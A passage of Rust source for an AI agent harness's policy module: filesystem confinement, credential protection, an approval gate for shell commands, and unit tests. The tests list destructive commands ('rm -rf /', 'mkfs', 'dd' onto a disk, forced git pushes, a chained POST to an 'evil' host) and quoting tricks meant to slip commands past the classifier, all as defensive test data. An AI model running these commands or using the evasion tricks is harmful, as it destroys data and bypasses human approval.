        if let Some(text) = config.as_ref().and_then(|c| c.file(".harness/policy.toml")) {
            let f: PolicyFile = std::str::from_utf8(text)
                .map_err(anyhow::Error::from)
                .and_then(|t| toml::from_str(t).map_err(anyhow::Error::from))
                .map_err(|e| anyhow::anyhow!("bad .harness/policy.toml: {e}"))?;
            p.read_roots.extend(
                f.fs.read
                    .iter()
                    .map(|r| fs_root(&workspace, r))
                    .collect::<Result<Vec<_>>>()?,
            );
            let w =
                f.fs.write
                    .iter()
                    .map(|r| fs_root(&workspace, r))
                    .collect::<Result<Vec<_>>>()?;
            p.read_roots.extend(w.clone());
            p.write_roots.extend(w);
            p.budget = Budget {
                max_tokens: f.budget.max_tokens,
                max_wall_secs: f.budget.max_wall_secs,
            };
            crate::vm::check_packs(&f.packs.enable).context("bad .harness/policy.toml")?;
            p.packs = f.packs.enable;
            p.ask = f.approval.ask;
            p.allow = f.approval.allow;
            if let Some(m) = f.approval.mode {
                p.mode = m;
            }
        }
        if let Some(m) = approval_mode {
            p.mode = m; // the launching user's choice beats the file
        }
        p.read_roots.sort();
        p.read_roots.dedup();
        check_roots(dirs, p.read_roots.iter().chain(&p.write_roots))?;
        // Landlock only adds access: a sealed root under a read root would be readable by every shell command.
        if let Some((s, r)) = p.sealed.iter().find_map(|s| {
            p.read_roots
                .iter()
                .find(|r| s.starts_with(r))
                .map(|r| (s, r))
        }) {
            bail!(
                "autoresearch: {} lies inside {}, which the agent's shell commands may read; move it outside",
                s.display(),
                r.display()
            );
        }
        // Automatic approval never disables the audit log.
        let log = EventLog::open(&own.log)?;
        let config_sha = match &config {
            Some(c) => c.hash(),
            None => crate::trust::config_hash(&workspace),
        };
        log.write("session", json!({"workspace": workspace.to_string_lossy(), "tmp": p.tmp.to_string_lossy(), "autopilot": autopilot,
            "approval_mode": p.mode, "config_sha": config_sha, "trusted": config.is_some(), "modules_sha": modules_sha,
            "confinement": crate::confine::describe()}), true)?;
        let ar_progress = crate::ar::Progress::start(p.episode.as_ref()).into();
        Ok(Policy {
            cfg: p,
            log,
            grants: Default::default(),
            dirs: dirs.clone(),
            prompt: Default::default(),
            ar_progress,
        }
        .live())
    }

    pub fn snapshot(&self) -> Snapshot {
        self.cfg.clone()
    }

    /// What a child process (`sh`, a local MCP server) may touch, from the current policy and the grants approved so
    /// far: the read roots and this run's materialized skills (read), the write roots (write). Built per spawn, so a
    /// grant approved mid-run applies to later commands. Protected configuration inside a write root stays writable by
    /// children: Landlock cannot carve a hole in a writable tree without breaking file creation in it.
    pub fn confinement(&self) -> crate::confine::Rules {
        let (mut read, mut write) = (self.read_roots.clone(), self.write_roots.clone());
        read.push(self.registry());
        for g in self.grants.lock().unwrap().iter() {
            // A grant that is not recursive names a file. Landlock applies a rule on a directory to everything
            // below it, so a path that is a directory now is not passed on.
            if !g.recursive && g.path.is_dir() {
                continue;
            }
            read.push(g.path.clone());
            if g.write {
                write.push(g.path.clone());
            }
        }
        crate::confine::Rules { read, write }.with_system()
    }

    /// The Landlock ruleset for a child started now (`confinement`), built on a blocking thread: it opens every root.
    pub async fn ruleset(
        self: &Arc<Self>,
    ) -> std::io::Result<Option<Arc<crate::confine::Ruleset>>> {
        let pol = self.clone();
        let ruleset = tokio::task::spawn_blocking(move || pol.confinement().prepare())
            .await
            .map_err(std::io::Error::other)??;
        Ok(ruleset.map(Arc::new))
    }

    /// This run's materialized skills (`Registry::materialize_skills`): the one part of hx's state the model may
    /// read, so that a skill's supporting files are there for it.
    fn registry(&self) -> PathBuf {
        self.log.dir().join("registry").join(&self.log.session)
    }

    /// Effect class of a shell command: the highest class of its simple commands.
    pub fn classify_sh(&self, cmd: &str) -> Class {
        self.segments(cmd)
            .into_iter()
            .map(|(_, c)| c)
            .max()
            .unwrap_or(Class::LocalWrite)
            .max(if self.ask.iter().any(|p| cmd.contains(p.as_str())) {
                Class::External
            } else {
                Class::LocalWrite
            })
    }

    /// Each simple command of `cmd` (its words) with its effect class.
    fn segments(&self, cmd: &str) -> Vec<(Vec<String>, Class)> {
        commands(cmd)
            .into_iter()
            .map(|words| {
                let text = words.join(" ");
                let class =
                    class_of(&words).max(if self.ask.iter().any(|p| text.contains(p.as_str())) {
                        Class::External
                    } else {
                        Class::LocalWrite
                    });
                (words, class)
            })
            .collect()
    }

    /// The approval gate for a shell command. Returns who approved it, or why it was refused. The run's approval settings are frozen in Rust; Luau code and hooks
    /// cannot change them. `--yes` approves external requests but never an irreversible one: that needs an exact
    /// `allow` entry or the owner's answer on the terminal.
    pub async fn approve(
        &self,
        cmd: &str,
        class: Class,
    ) -> std::result::Result<ApprovalSource, ApprovalRequired> {
        if matches!(class, Class::Read | Class::LocalWrite) {
            return Ok(ApprovalSource::NotRequired);
        }
        if class == Class::Irreversible {
            if self.allow.iter().any(|a| a.trim() == cmd.trim()) {
                return Ok(ApprovalSource::PolicyAllow);
            }
        } else if self.autopilot {
            return Ok(ApprovalSource::Auto);
        } else if self.allowed(cmd) {
            return Ok(ApprovalSource::PolicyAllow);
        }
        let how = if class == Class::Irreversible {
            "add the exact command to [approval] allow"
        } else {
            "set [approval] allow"
        };
        self.ask_owner(
            class,
            &format!("{} command:\n  {}", class.name(), shown(cmd)),
            how,
        )
        .await
    }

    /// The approval gate for a named MCP or HTTP call, decided on its fixed identity. `args` is shown in the prompt
    /// and never matched against `allow`. Returns the approval source, as `approve` does.
    pub async fn approve_call(
        &self,
        call: Call<'_>,
        args: &serde_json::Value,
        class: Class,
    ) -> std::result::Result<ApprovalSource, ApprovalRequired> {
        if matches!(class, Class::Read | Class::LocalWrite) {
            return Ok(ApprovalSource::NotRequired);
        }
        if self.autopilot && class != Class::Irreversible {
            return Ok(ApprovalSource::Auto);
        }
        if self.allow.iter().any(|a| call.allowed_by(a)) {
            return Ok(ApprovalSource::PolicyAllow);
        }
        let text = args.to_string();
        let mut shown_args = shown(&text.chars().take(PROMPT_ARGS_CHARS).collect::<String>());
        if text.chars().nth(PROMPT_ARGS_CHARS).is_some() {
            shown_args.push_str(" ...");
        }
        let how = format!("add \"{call}\" to [approval] allow");
        self.ask_owner(
            class,
            &format!("{} call: {call}\n  arguments: {shown_args}", class.name()),
            &how,
        )
        .await
    }

    /// Ask the owner on the terminal (prompt mode), or refuse with `how` as the remedy (deny mode).
    async fn ask_owner(
        &self,
        class: Class,
        question: &str,
        how: &str,
    ) -> std::result::Result<ApprovalSource, ApprovalRequired> {
        let irreversible = class == Class::Irreversible;
        if self.mode == ApprovalMode::Prompt {
            let _guard = self.prompt.lock().await;
            return match ask(question).await {
                Ok(true) => Ok(ApprovalSource::Prompt),
                Ok(false) => Err(ApprovalRequired("the user declined; it was NOT run".into())),
                Err(_) if irreversible => Err(ApprovalRequired(format!(
                    "this is an irreversible effect and there is no controlling terminal to ask; it was NOT run (--yes never approves irreversible effects; {how})"
                ))),
                Err(e) => Err(ApprovalRequired(e.to_string())),
            };
        }
        let other = if irreversible {
            "or use --approval prompt"
        } else {
            "use --approval prompt, or launch with --yes"
        };
        Err(ApprovalRequired(format!(
            "this is an {} effect and needs the user's approval; it was NOT run ({how}, {other})",
            class.name()
        )))
    }

    /// An external command is pre-approved when an `allow` entry covers each of its external simple commands, so an
    /// entry for one command cannot approve another chained after it. An entry covers a simple command when the
    /// command's words start with the entry's words: `git push origin` covers `git push origin main` but not
    /// `sendmail x --note "git push origin"`.
    fn allowed(&self, cmd: &str) -> bool {
        let entries: Vec<Vec<String>> = self
            .allow
            .iter()
            .filter_map(|a| {
                let mut parsed = commands(a);
                (parsed.len() == 1).then(|| parsed.remove(0))
            })
            .collect();
        let external: Vec<_> = self
            .segments(cmd)
            .into_iter()
            .filter(|(_, c)| *c >= Class::External)
            .collect();
        !external.is_empty()
            && external.iter().all(|(words, _)| {
                let words = command_words_after_reserved(words);
                entries.iter().any(|e| words.starts_with(e))
            })
    }

    /// Request an ordinary missing path permission. Call only after principal/stage authorization.
    /// Grants are shared by descendants and journaled before use, so resume restores the same permissions.
    pub async fn authorize_path(&self, path: &str, write: bool) -> Result<()> {
        let check = || {
            if write {
                self.check_write(path)
            } else {
                self.check_read(path)
            }
        };
        let denied = match check() {
            Ok(_) => return Ok(()),
            Err(e) => e,
        };
        if !denied.is::<OutsideRoots>() {
            return Err(denied);
        }
        let _guard = self.prompt.lock().await;
        let denied = match check() {
            Ok(_) => return Ok(()),
            Err(e) => e,
        };
        let Some(outside) = denied.downcast_ref::<OutsideRoots>() else {
            return Err(denied);
        };
        // A write names one file, existing or new. A directory is no file: granted, it would reach a child's
        // Landlock rules as its whole tree.
        if write && outside.path.exists() && !outside.path.is_file() {
            bail!(
                "policy: {} is not a file; outside the allowed roots only a single file can be granted for writing",
                shown(&outside.path.to_string_lossy())
            );
        }
        // The requested file itself (children can then change it, not create its siblings), or a requested directory
        // for reading; never a tree that holds the home directory, protected configuration or hx's own files.
        let grant = PathGrant {
            path: outside.path.clone(),
            recursive: !write && outside.path.is_dir(),
            write,
        };
        if grant.recursive
            && let Some(what) = self.covers_owner_state(&grant.path)
        {
            bail!(
                "policy: {} is a directory that contains {what}; it cannot be granted to the model (add a narrower root to [fs] in policy.toml)",
                shown(&grant.path.to_string_lossy())
            );
        }
        // Autopilot grants single files. A directory exposes everything in it, including credential files that file
        // tools refuse by name but shell commands can read, so only the owner can grant one. The same goes for
        // writing a hidden file or anything under a hidden directory: shell startup files, `~/.ssh`, `~/.config` and
        // another repository's `.git` are where a write turns into code that runs later, outside this run.
        let hidden = grant.path.components().any(|c| {
            matches!(c, std::path::Component::Normal(name) if name.as_encoded_bytes().starts_with(b"."))
        });
        let source = if self.autopilot && !grant.recursive && !(write && hidden) {
            ApprovalSource::Auto
        } else {
            if self.mode == ApprovalMode::Deny {
                return Err(denied);
            }
            let (access, what) = if write {
                ("read/write", "the file")
            } else if grant.recursive {
                ("read", "everything under")
            } else {
                ("read", "the file")
            };
            match ask(&format!(
                "allow {access} access to {what} {} for this run? (requested {})",
                shown(&grant.path.to_string_lossy()),
                shown(path)
            ))
            .await
            {
                Ok(true) => ApprovalSource::Prompt,
                Ok(false) => bail!(ApprovalRequired(format!("{denied}; the user declined"))),
                Err(_) if self.autopilot => bail!(ApprovalRequired(format!(
                    "{denied}; --yes does not grant a directory or writing a hidden path, and there is no controlling terminal to ask"
                ))),
                Err(e) => bail!(ApprovalRequired(format!("{denied}; {e}"))),
            }
        };
        // Log before publishing a grant. Cancellation cannot grant unrecorded authority.
        self.log.write(
            "path_grant",
            json!({"grant": grant, "source": source.name()}),
            true,
        )?;
        self.grants.lock().unwrap().push(grant);
        check()?;
        Ok(())
    }

    /// What owner state a recursive grant of `dir` would expose, if any: the home directory (and so every credential
    /// in it), protected configuration, sealed state or hx's own files.
    fn covers_owner_state(&self, dir: &Path) -> Option<&'static str> {
        if dir.parent().is_none() {
            return Some("the whole filesystem");
        }
        if std::env::var_os("HOME")
            .and_then(canon)
            .is_some_and(|home| home.starts_with(dir))
        {
            return Some("your home directory");
        }
        if self.protected.iter().any(|p| p.starts_with(dir)) {
            return Some("protected harness configuration");
        }
        if self.sealed.iter().any(|p| p.starts_with(dir)) {
            return Some("sealed owner state");
        }
        if self.dirs.overlap(dir).is_some() {
            return Some("hx's own configuration or state");
        }
        None
    }

    fn granted(&self, path: &Path, write: bool) -> bool {
        self.grants.lock().unwrap().iter().any(|g| {
            (!write || g.write)
                && ((g.recursive && path.starts_with(&g.path))
                    || (path == g.path && !path.is_dir()))
        })
    }

    pub fn is_sealed(&self, path: &Path) -> bool {
        Self::within(path, &self.sealed)
    }

    fn within(path: &Path, roots: &[PathBuf]) -> bool {
        roots.iter().any(|r| path.starts_with(r))
    }

    /// Is `path` hx's own configuration or state? This run's materialized skills are not: the model reads them.
    fn is_own(&self, path: &Path) -> bool {
        self.dirs.owns(path) && !path.starts_with(self.registry())
    }

    /// Resolve `p` (relative to the workspace) for reading; the canonical path must be inside a read root (or this
    /// run's materialized skills).
    pub fn check_read(&self, p: &str) -> Result<PathBuf> {
        let full = normalize(&self.abs(p));
        let canonical = std::fs::canonicalize(self.abs(p));
        if self.is_sealed(&full) || canonical.as_ref().is_ok_and(|c| self.is_sealed(c)) {
            bail!("policy: {p} is sealed owner state and cannot be read");
        }
        if self.is_own(&full) || canonical.as_ref().is_ok_and(|c| self.is_own(c)) {
            bail!("policy: {p} is hx's own configuration or state and cannot be read");
        }
        let c = canonical.map_err(|e| anyhow::anyhow!("{p}: {e}"))?;
        if is_secret(&c) {
            bail!("policy: {p} is a credential file and cannot be read");
        }
        if !Self::within(&c, &self.read_roots)
            && !c.starts_with(self.registry())
            && !self.granted(&c, false)
        {
            return Err(OutsideRoots {
                path: c,
                write: false,
            }
            .into());
        }
        Ok(c)
    }

    /// Resolve `p` for writing: lexically normalized, no symlink anywhere on the not-yet-existing tail or at the
    /// target, existing ancestor canonicalized, result inside a write root and outside every protected path.
    pub fn check_write(&self, p: &str) -> Result<PathBuf> {
        let full = normalize(&self.abs(p));
        let mut existing = full.clone();
        let mut tail: Vec<std::ffi::OsString> = vec![];
        while std::fs::symlink_metadata(&existing).is_err() {
            match (
                existing.file_name().map(|n| n.to_os_string()),
                existing.parent().map(|x| x.to_path_buf()),
            ) {
                (Some(n), Some(par)) => {
                    tail.push(n);
                    existing = par;
                }
                _ => bail!("policy: cannot resolve {p}"),
            }
        }
        if tail.is_empty()
            && std::fs::symlink_metadata(&existing)?
                .file_type()
                .is_symlink()
        {
            bail!("policy: refusing to write through the symlink {p}");
        }
        let mut c = std::fs::canonicalize(&existing)?;
        for t in tail.iter().rev() {
            c.push(t);
        }
        if self.is_sealed(&full) || self.is_sealed(&c) {
            bail!("policy: {p} is sealed owner state and cannot be written");
        }
        if Self::within(&c, &self.protected) || self.dirs.owns(&full) || self.dirs.owns(&c) {
            bail!(
                "policy: {p} is protected (harness configuration and hx's own state cannot be modified by the model)"
            );
        }
        if !Self::within(&c, &self.write_roots) && !self.granted(&c, true) {
            return Err(OutsideRoots {
                path: c,
                write: true,
            }
            .into());
        }
        Ok(c)
    }

    pub fn abs(&self, p: &str) -> PathBuf {
        let p = Path::new(p);
        if p.is_absolute() {
            p.to_path_buf()
        } else {
            self.workspace.join(p)
        }
    }

    /// Environment passed to `sh`: a small allowlist, HOME and TMPDIR pointing at the run's temp dir. No API keys.
    pub fn env(&self) -> Vec<(String, String)> {
        let mut v: Vec<(String, String)> = ENV_ALLOW
            .iter()
            .filter_map(|k| std::env::var(k).ok().map(|x| (k.to_string(), x)))
            .collect();
        let t = self.tmp.to_string_lossy().to_string();
        v.push(("HOME".into(), t.clone()));
        v.push(("TMPDIR".into(), t));
        // HOME is the temp dir, so rustup/cargo would not find the user's toolchain; point them at the real (readable) dirs.
        let home = std::env::var("HOME").unwrap_or_default();
        for (var, dir) in [("RUSTUP_HOME", ".rustup"), ("CARGO_HOME", ".cargo")] {
            let val = std::env::var(var).ok().or_else(|| {
                canon(Path::new(&home).join(dir)).map(|p| p.to_string_lossy().to_string())
            });
            if let Some(val) = val {
                v.push((var.into(), val));
            }
        }
        v
    }
}

/// The system and toolchain directories every child may read (autoresearch evaluators, which have no run policy).
pub fn system_read_roots() -> Vec<PathBuf> {
    SYSTEM_READ
        .iter()
        .filter_map(canon)
        .chain(toolchain_roots())
        .collect()
}

/// Refuse roots that would put hx's own configuration or state within the model's reach: Landlock grants a whole
/// tree, so a root that contains either directory (or lies inside one) would expose the trust store, secrets or journals.
fn check_roots<'a>(dirs: &Dirs, roots: impl IntoIterator<Item = &'a PathBuf>) -> Result<()> {
    for root in roots {
        if let Some((what, dir)) = dirs.overlap(root) {
            bail!(
                "policy: {} cannot be a root of the model's: it overlaps hx's {what} directory {} (narrow [fs] in .harness/policy.toml, \
                use another workspace, or move hx's directories with XDG_CONFIG_HOME / XDG_STATE_HOME)",
                root.display(),
                dir.display()
            );
        }
    }
    Ok(())
}

/// An `[fs]` root from `policy.toml`: `~` is the owner's home, a relative path is relative to the workspace, and a
/// root that does not resolve to an existing path is an error rather than silently dropped.
fn fs_root(workspace: &Path, root: &str) -> Result<PathBuf> {
    let home = || {
        std::env::var_os("HOME").map(PathBuf::from).ok_or_else(|| {
            anyhow::anyhow!(
                "bad .harness/policy.toml: [fs] root {root:?} uses ~ but HOME is not set"
            )
        })
    };
    let path = match root.strip_prefix('~') {
        Some("") => home()?,
        Some(rest) if rest.starts_with('/') => home()?.join(rest.trim_start_matches('/')),
        _ => workspace.join(root),
    };
    std::fs::canonicalize(&path).with_context(|| {
        format!(
            "bad .harness/policy.toml: [fs] root {root:?} ({}) does not resolve",
            path.display()
        )
    })
}

/// A logged path is not authority to remove arbitrary directories on shutdown. Scratch paths must be direct,
/// non-symlink children of this user's system temp directory with the exact name generated by Policy::new.
fn validate_scratch(path: &Path) -> Result<()> {
    let base = std::fs::canonicalize(std::env::temp_dir())?;
    let name = path.file_name().and_then(|s| s.to_str()).unwrap_or("");
    let valid_name = name
        .strip_prefix("hx-")
        .and_then(|s| s.split_once('-'))
        .is_some_and(|(pid, nanos)| {
            !pid.is_empty()
                && !nanos.is_empty()
                && pid.bytes().all(|b| b.is_ascii_digit())
                && nanos.bytes().all(|b| b.is_ascii_digit())
                && pid.parse::<u32>().is_ok_and(|p| p > 0)
                && nanos.parse::<u32>().is_ok_and(|n| n < 1_000_000_000)
        });
    anyhow::ensure!(
        valid_name && path.parent() == Some(base.as_path()),
        "invalid recorded scratch directory: {}",
        path.display()
    );
    if let Ok(meta) = std::fs::symlink_metadata(path) {
        anyhow::ensure!(
            meta.is_dir() && !meta.file_type().is_symlink(),
            "invalid recorded scratch directory: {}",
            path.display()
        );
    }
    Ok(())
}

/// The journal and private temp directory of every live `Policy`, so that `end_live_sessions` can end them when hx
/// is stopped by a signal: the stop path exits without running destructors.
static LIVE: std::sync::Mutex<Vec<(Arc<EventLog>, PathBuf)>> = std::sync::Mutex::new(Vec::new());

impl Policy {
    fn live(self) -> Self {
        LIVE.lock()
            .unwrap()
            .push((self.log.clone(), self.tmp.clone()));
        self
    }
}

/// Close a session: a final journal record (best effort: the journal may already have failed) and the private temp
/// directory removed.
fn end_session(log: &EventLog, tmp: &Path) {
    let _ = log.write("session_end", json!({}), true);
    let _ = std::fs::remove_dir_all(tmp);
}

/// End every live policy's session, as dropping it would. For the signal stop path only.
pub fn end_live_sessions() {
    for (log, tmp) in std::mem::take(&mut *LIVE.lock().unwrap()) {
        end_session(&log, &tmp);
    }
}

impl Drop for Policy {
    fn drop(&mut self) {
        LIVE.lock().unwrap().retain(|(_, tmp)| *tmp != self.tmp);
        end_session(&self.log, &self.tmp);
    }
}

/// Directories under $HOME that hold the user's toolchains (so `python3`, `git`, `cargo` are readable by file tools).
fn toolchain_roots() -> Vec<PathBuf> {
    let home = std::env::var("HOME").ok().and_then(canon);
    let mut out = vec![];
    let Some(home) = home else { return out };
    let path = std::env::var("PATH").unwrap_or_default();
    for t in TOOLS {
        for dir in std::env::split_paths(&path) {
            if let Some(real) = canon(dir.join(t)) {
                // Only the tool's own directory: its parent may be a catch-all such as ~/.local.
                if let Some(dir) = real.parent().filter(|d| d.starts_with(&home) && *d != home) {
                    out.push(dir.to_path_buf());
                }
                break;
            }
        }
    }
    for d in [
        ".cargo",
        ".rustup",
        ".local/share/uv",
        ".nvm",
        ".pyenv",
        ".rbenv",
    ] {
        if let Some(c) = canon(home.join(d)) {
            out.push(c);
        }
    }
    out.sort();
    out.dedup();
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dirs::TestDirs;

    #[test]
    fn resume_cannot_adopt_and_delete_an_unrelated_scratch_directory() {
        let dirs = TestDirs::new();
        let dir =
            std::env::temp_dir().join(format!("hx-policy-scratch-test-{}", std::process::id()));
        let victim = dir.join("unrelated");
        std::fs::create_dir_all(&victim).unwrap();
        std::fs::write(victim.join("sentinel"), "KEEP").unwrap();
        let log = EventLog::open(&dirs.workspace(&dir).log).unwrap();
        log.write("session", json!({"workspace": dir, "tmp": victim}), true)
            .unwrap();
        let path = log.path.clone();
        drop(log);
        let result = Policy::new(&dirs, &dir, false, None, Some(&path), None);
        let accepted = result.is_ok();
        drop(result);
        assert!(
            victim.join("sentinel").exists(),
            "Policy::drop deleted unrelated data"
        );
        assert!(
            !accepted,
            "an arbitrary logged path is not an owned scratch directory"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn scratch_validation_rejects_symlinks_nested_and_invalid_names() {
        let base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let scratch = base.join(format!("hx-{}-999999999", std::process::id()));
        std::fs::create_dir_all(&scratch).unwrap();
        assert!(validate_scratch(&scratch).is_ok());
        for invalid in [
            scratch.join("child"),
            base.join("hx-0-1"),
            base.join("hx-1-1000000000"),
            base.join("hx-1-1-extra"),
            PathBuf::from("hx-1-1"),
        ] {
            assert!(validate_scratch(&invalid).is_err(), "{}", invalid.display());
        }
        std::fs::remove_dir(&scratch).unwrap();
        std::os::unix::fs::symlink(&base, &scratch).unwrap();
        assert!(validate_scratch(&scratch).is_err());
        std::fs::remove_file(scratch).unwrap();
    }

    #[test]
    fn normalize_resolves_dots_lexically() {
        assert_eq!(
            normalize(Path::new("/a/b/../c/./d")),
            PathBuf::from("/a/c/d")
        );
        assert_eq!(normalize(Path::new("/a/../../b")), PathBuf::from("/b"));
    }

    #[test]
    fn classify_sh_orders_irreversible_before_external() {
        let dirs = TestDirs::new();
        let dir = std::env::temp_dir().join(format!("hx-policy-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let p = Policy::new(&dirs, &dir, false, None, None, None).unwrap();
        assert_eq!(
            p.classify_sh("git push --force origin main"),
            Class::Irreversible
        );
        assert_eq!(p.classify_sh("git push origin main"), Class::External);
        assert_eq!(p.classify_sh("ls -la"), Class::LocalWrite);
        // writes: inside the workspace ok, protected and escaping paths refused
        assert!(p.check_write("src/new.txt").is_ok());
        assert!(p.check_write(".harness/policy.toml").is_err());
        assert!(p.check_write("hx.lock").is_err());
        assert!(p.check_write("../escape.txt").is_err());
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A policy over a fresh workspace, in deny mode (nothing ever asks the terminal), with `allow` pre-approved, and
    /// hx's directories (removed when dropped).
    fn test_policy(tag: &str, autopilot: bool, allow: &[&str]) -> (Policy, PathBuf, TestDirs) {
        let dirs = TestDirs::new();
        let dir = std::env::temp_dir().join(format!("hx-policy-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let dir = std::fs::canonicalize(dir).unwrap();
        let mut p =
            Policy::new(&dirs, &dir, autopilot, Some(ApprovalMode::Deny), None, None).unwrap();
        p.cfg.allow = allow.iter().map(|s| s.to_string()).collect();
        (p, dir, dirs)
    }

    #[test]
    fn classification_is_on_shell_words() {
        let (p, dir, _dirs) = test_policy("words", false, &[]);
        for cmd in [
            "git push origin main --force",
            "git push --force-with-lease",
            "git  push -f",
            "git push origin --delete old",
            "git push origin +main",
            "git -C repo push --force",
            "cd x && git push -fu origin main",
            "rm -rf ~",
            "rm -fr /",
            "rm -r -f $HOME",
            "sudo rm -rf /",
            "echo $(git push --force)",
            "bash -c 'git push --force'",
            "mkfs.ext4 /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
        ] {
            assert_eq!(p.classify_sh(cmd), Class::Irreversible, "{cmd}");
        }
        for cmd in [
            "git push origin main",
            "git  push",
            "curl -XPOST https://x",
            "curl --request POST https://x",
            "curl --request=put x",
            "curl -X DELETE x",
            "ls; ssh host",
            "aws s3 ls",
            "/usr/bin/gh pr create",
            "kubectl -n prod apply -f x.yaml",
            "FOO=1 npm publish",
        ] {
            assert_eq!(p.classify_sh(cmd), Class::External, "{cmd}");
        }
        for cmd in [
            "echo the laws are clear",
            "echo 'git push --force'",
            "git commit -m 'never git push --force'",
            "rm -rf build",
            "rm -rf /tmp/scratch",
            "curl https://example.com",
            "grep -r aws src",
            "cat README.md # git push",
        ] {
            assert_eq!(p.classify_sh(cmd), Class::LocalWrite, "{cmd}");
        }
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn autopilot_never_approves_an_irreversible_command() {
        let (p, dir, _dirs) = test_policy("autopilot", true, &[]);
        assert_eq!(
            p.approve("git push origin main", Class::External)
                .await
                .ok(),
            Some(ApprovalSource::Auto)
        );
        assert_eq!(
            p.approve("ls", Class::LocalWrite).await.ok(),
            Some(ApprovalSource::NotRequired)
        );
        for cmd in ["git push origin main --force", "rm -rf ~"] {
            assert_eq!(p.classify_sh(cmd), Class::Irreversible);
            assert!(p.approve(cmd, Class::Irreversible).await.is_err(), "{cmd}");
        }
        drop(p);
        let (p, dir2, _dirs2) = test_policy("autopilot-allow", true, &["rm -rf ~"]);
        assert_eq!(
            p.approve("rm -rf ~", Class::Irreversible).await.ok(),
            Some(ApprovalSource::PolicyAllow)
        );
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
        let _ = std::fs::remove_dir_all(&dir2);
    }

    #[tokio::test]
    async fn a_substring_allow_cannot_approve_a_reordered_force_push_or_a_chained_command() {
        let (p, dir, _dirs) = test_policy("reorder", false, &["git push origin"]);
        let forced = "git push origin main --force";
        assert_eq!(p.classify_sh(forced), Class::Irreversible);
        assert!(p.approve(forced, p.classify_sh(forced)).await.is_err());
        assert_eq!(
            p.approve("git push origin main", Class::External)
                .await
                .ok(),
            Some(ApprovalSource::PolicyAllow)
        );
        let chained = "git push origin main && curl -XPOST https://evil";
        assert!(p.approve(chained, p.classify_sh(chained)).await.is_err());
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn compound_and_wrapped_commands_classify_no_lower_than_the_bare_command() {
        let (p, dir, _dirs) = test_policy("shapes", false, &[]);
        let irreversible = [
            "for b in a; do git push --force; done",
            "{ git push --force; }",
            "if true; then git push --force; fi",
            "while true; do git push --force; done",
            "! git push --force",
            "case x in x) git push --force;; esac",
            "timeout 5s git push --force",
            "timeout -s KILL 5 git push --force",
            "timeout -k 5 10 rm -rf /",
            "env -u X git push --force",
            "env -i git push --force",
            "env FOO=1 rm -rf /",
            "sudo -u root git push --force",
            "sudo -u root rm -rf /",
            "sudo -E git push --force",
            "sudo -- rm -rf /",
            "doas rm -rf /",
            "nice -n 5 git push --force",
            "nice -n 10 rm -rf /",
            "ionice -c3 rm -rf /",
            "stdbuf -o0 rm -rf /",
            "setsid rm -rf /",
            "chroot / rm -rf /",
            "busybox rm -rf /",
            "nohup git push --force",
            "xargs -n1 git push --force",
            "xargs -I{} git push --force {}",
            "sudo nice -n 5 timeout 9 git push --force",
            "find . -exec git push --force \\;",
            "find . -execdir git push -f \\;",
            "find . -ok rm -rf / \\;",
            "git --git-dir .git push --force",
            "git --git-dir=.git push --force",
            "git --work-tree . push --force",
            "git -C . -c a=b push --force",
            "git -c core.x=y push --force",
            "bash -c -- 'git push --force'",
            "rm -rf $HOME/.",
            "rm -rf ~/.",
            "rm -rf /.",
            "rm -rf /./",
            "rm -rf //",
            "f() { git push --force; }; f",
        ];
        for cmd in irreversible {
            assert_eq!(p.classify_sh(cmd), Class::Irreversible, "{cmd}");
        }
        for cmd in [
            "timeout 5 git push origin main",
            "{ ssh host; }",
            "for h in a b; do scp f $h:; done",
            "sudo -u x aws s3 ls",
            "git --git-dir .git push origin main",
            "find . -exec curl -X POST https://x \\;",
        ] {
            assert_eq!(p.classify_sh(cmd), Class::External, "{cmd}");
        }
        for cmd in [
            "timeout 60 cargo test",
            "find . -name '*.rs' -delete",
            "for f in *.txt; do wc -l $f; done",
            "if [ -f x ]; then rm -rf build; fi",
            "git --no-pager log --oneline",
            "git commit -m push",
            "env FOO=1 make",
            "rm -rf ./build/.",
            "xargs echo < list",
        ] {
            assert_eq!(p.classify_sh(cmd), Class::LocalWrite, "{cmd}");
        }
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn unknown_programs_need_approval_and_everyday_commands_do_not() {
        let (p, dir, _dirs) = test_policy("unknown", false, &[]);
        let padded = |wrapper: &str, pad: &str, n: usize| {
            format!(
                "{wrapper} {} git push --force origin main",
                vec![pad; n].join(" ")
            )
        };
        let must_ask = vec![
            "g$'i't push origin main".to_string(),
            "$x push origin main".into(),
            "\"$(echo git)\" push origin main".into(),
            "`echo git` push origin main".into(),
            "$(echo git) push origin main".into(),
            "${GIT} push origin main".into(),
            "$'git' push origin main".into(),
            "sudo $x push origin main".into(),
            "env A=1 \"$PROG\" push".into(),
            "git $'push' --force origin main".into(),
            "echo $'it\\'s' ; git push origin main".into(),
            "find . -exec \"$x\" push \\;".into(),
            "command -v git; git push".into(),
            "sudo command git push".into(),
        ];
        for cmd in &must_ask {
            assert!(p.classify_sh(cmd) >= Class::External, "{cmd}");
        }
        // `time` has an option of its own, and `env` can be handed its command as one string.
        for (cmd, class) in [
            ("time -p git push origin main", Class::External),
            (
                "time -p -- git push --force origin main",
                Class::Irreversible,
            ),
            ("env -S 'git push origin main'", Class::External),
            ("env -S 'git push --force origin main'", Class::Irreversible),
            ("env --split-string='git push --force'", Class::Irreversible),
            ("env --split-string 'git push --force'", Class::Irreversible),
            ("env -iS 'git push --force'", Class::Irreversible),
            ("env -S'git push --force'", Class::Irreversible),
            (
                "sudo find . -name x -exec git push --force \\;",
                Class::Irreversible,
            ),
            ("find . -exec sh -c 'git push' \\;", Class::External),
        ] {
            assert_eq!(p.classify_sh(cmd), class, "{cmd}");
        }
        // A program hidden past the bound is never approved by autopilot.
        let mut hidden = vec![format!(
            "find . {} -exec git push --force \\;",
            vec!["-name x -o"; 20].join(" ")
        )];
        for (wrapper, pad) in [
            ("env", "-u A"),
            ("env", "A=1"),
